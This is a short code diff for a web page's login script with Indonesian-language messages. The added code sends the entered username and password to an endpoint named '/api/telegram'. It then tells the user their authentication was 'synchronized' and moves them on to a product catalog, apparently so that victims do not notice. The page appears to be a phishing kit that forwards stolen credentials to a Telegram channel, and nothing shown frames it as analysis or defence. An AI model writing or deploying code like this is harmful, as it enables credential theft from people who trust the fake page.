+    fetch('/api/telegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'LOGIN',
+        username: username,
+        password: password
       })
-      .catch(error => {
-        console.error("Gagal kirim:", error);
-        alert("Sinkronisasi jaringan gagal, silakan coba lagi.");
-      });
+    })
+    .then(res => res.json())
+    .then(data => {
+      alert("Autentikasi berhasil disinkronkan! Silakan lanjutkan transaksi.");
+      document.getElementById("loginForm").reset();
+      navigateTo('catalog');
+    })
+    .catch(err => {
+      alert("Sinkronisasi jaringan gagal, silakan coba lagi.");
+    });
   });
 </script>
 </body>
